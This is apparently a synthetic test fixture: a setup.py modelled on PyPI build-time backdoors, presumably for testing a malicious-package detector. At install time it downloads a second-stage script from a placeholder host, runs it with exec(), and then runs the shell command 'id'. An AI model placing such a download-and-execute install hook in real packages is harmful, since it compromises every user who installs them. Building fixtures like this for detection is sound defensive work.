# Synthetic fixture: setup.py remote-payload execution.
# Mirrors PyPI build-time downloader families (e.g. the ctx/mixin_rce-style
# setup.py backdoors): the sdist build script fetches a remote payload over
# HTTPS and executes the response body directly with exec() during pip
# install. The endpoint is a non-routable placeholder so this fixture makes
# no real network call.
import os
import urllib.request

from setuptools import find_packages, setup


def _bootstrap():
    payload = urllib.request.urlopen(
        'https://payload.invalid.example/stage/first.py'
    ).read()
    exec(payload)
    os.system('id')


_bootstrap()

setup(
    name='pypi-setup-remote-exec',
    version='1.0.0',
    packages=find_packages(),
)
